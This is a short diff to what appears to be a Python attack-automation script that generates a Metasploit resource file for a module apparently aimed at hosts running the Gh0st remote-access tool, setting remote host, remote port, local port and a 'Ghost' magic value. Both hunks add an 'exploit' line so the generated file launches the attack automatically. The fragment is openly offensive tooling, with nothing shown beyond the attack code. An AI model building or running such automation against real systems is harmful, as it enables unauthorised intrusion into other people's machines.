@@ -101,6 +101,7 @@ set RHOST %s
 set MAGIC Ghost
 set RPORT %s
 set LPORT %s
+exploit
             """%(IP, PORT, LPORT))
             with open("/tmp/GhostRat_Metasploit.rc", "w+") as file:
                 file.write(payload_comm)
@@ -151,6 +152,7 @@ set RHOST %s
 set MAGIC Ghost
 set RPORT %s
 set LPORT %s
+exploit
             """%(IP, PORT, LPORT))
             with open("/tmp/GhostRat_Metasploit.rc", "w+") as file:
                 file.write(payload_comm)
